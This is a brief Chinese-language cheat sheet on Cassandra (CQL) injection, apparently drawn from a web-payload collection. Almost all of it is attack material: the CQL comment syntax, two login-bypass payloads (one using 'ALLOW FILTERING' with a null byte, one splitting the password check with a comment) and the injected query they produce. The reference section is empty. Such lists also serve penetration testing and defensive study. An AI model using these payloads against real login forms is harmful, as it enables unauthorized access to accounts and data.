# Cassandra注入

> Apache Cassandra 是一个免费的开源分布式宽列存储NoSQL数据库管理系统

## 摘要

* [卡桑德拉注释](#卡桑德拉注释)
* [卡桑德拉 - 登录绕过](#卡桑德拉---登录绕过)
  * [登录绕过 0](#登录绕过-0)
  * [登录绕过 1](#登录绕过-1)
* [参考资料](#参考资料)

## 卡桑德拉注释

```sql
/* 卡桑德拉注释 */
```

## 卡桑德拉 - 登录绕过

### 登录绕过 0

```sql
用户名: admin' ALLOW FILTERING; %00
密码: 任意
```

### 登录绕过 1

```sql
用户名: admin'/*
密码: */and pass>'
```

注入将如下所示的SQL查询

```sql
SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;
```

## 参考资料
